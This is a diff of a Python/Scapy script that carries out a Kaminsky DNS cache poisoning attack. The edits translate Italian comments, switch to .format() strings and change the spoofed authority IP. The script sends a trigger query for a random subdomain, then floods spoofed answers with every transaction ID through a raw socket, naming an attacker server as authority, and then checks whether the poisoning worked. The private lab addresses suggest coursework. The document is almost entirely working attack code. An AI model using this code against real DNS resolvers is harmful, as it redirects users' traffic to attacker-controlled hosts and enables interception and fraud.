@@ -5,21 +5,21 @@ import random
 import string
 
 target_dns = "10.9.0.53"
-auth_dns = "10.9.0.153"
+auth_dns = "10.9.0.154"
 target_port = 33333
 
-# 1. Generiamo un prefisso casuale per aggirare la cache
-random_prefix = ''.join(random.choices(string.ascii_lowercase, k=5))
-domain = f"{random_prefix}.example.com"
+# 1. Generating a random subdomain to trigger the vulnerability
+random_prefix = ''.join([random.choice(string.ascii_lowercase) for _ in range(5)])
+domain = "{}.example.com".format(random_prefix)
 
-print(f"[*] 1. Sending trigger query for {domain}...")
+print("[*] 1. Sending trigger query for {}...".format(domain))
 trigger = IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
 send(trigger, verbose=0)
 
 print("[*] 2. Flooding spoofed KAMINSKY responses (Layer 2)...")
 # PAYLOAD KAMINSKY:
-# - ns: Inseriamo il nostro server falso come Autorità per l'intera zona
-# - ar: Forniamo l'IP del nostro server falso (L'IP della macchina Attaccante)
+# - ns: Inserting our fake server as Authority for the entire zone
+# - ar: Providing the IP of our fake server (The IP of the attacking machine)
 base_pkt = (
     Ether(dst="ff:ff:ff:ff:ff:ff") /
     IP(src=auth_dns, dst=target_dns) /
@@ -35,17 +35,17 @@ raw_bytes = bytearray(raw(base_pkt))
 s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
 s.bind(("eth0", 0))
 
-# L'offset del Transaction ID (id) è sempre 42 
+# Transaction ID (id) offset is always 42 
 # (14 Ethernet + 20 IP + 8 UDP = 42)
 for txid in range(0, 65535):
     struct.pack_into('!H', raw_bytes, 42, txid)
     s.send(raw_bytes)
 
-print(f"[+] Kaminsky flood complete for {domain}!")
+print("[+] Kaminsky flood complete for {}!".format(domain))
 
 print("[*] 3. Verifying cache poisoning...")
 verification = sr1(IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain)), timeout=3, verbose=0)
 if verification and verification.haslayer(DNS) and verification.an and verification.an.rdata == "1.1.1.1":
-    print(f"[+] Verification SUCCESS: {domain} resolves to 1.1.1.1")
+    print("[+] Verification SUCCESS: {} resolves to 1.1.1.1".format(domain))
 else:
-    print(f"[-] Verification FAILED: {domain} did not resolve to the fake IP")
+    print("[-] Verification FAILED: {} did not resolve to the fake IP".format(domain))
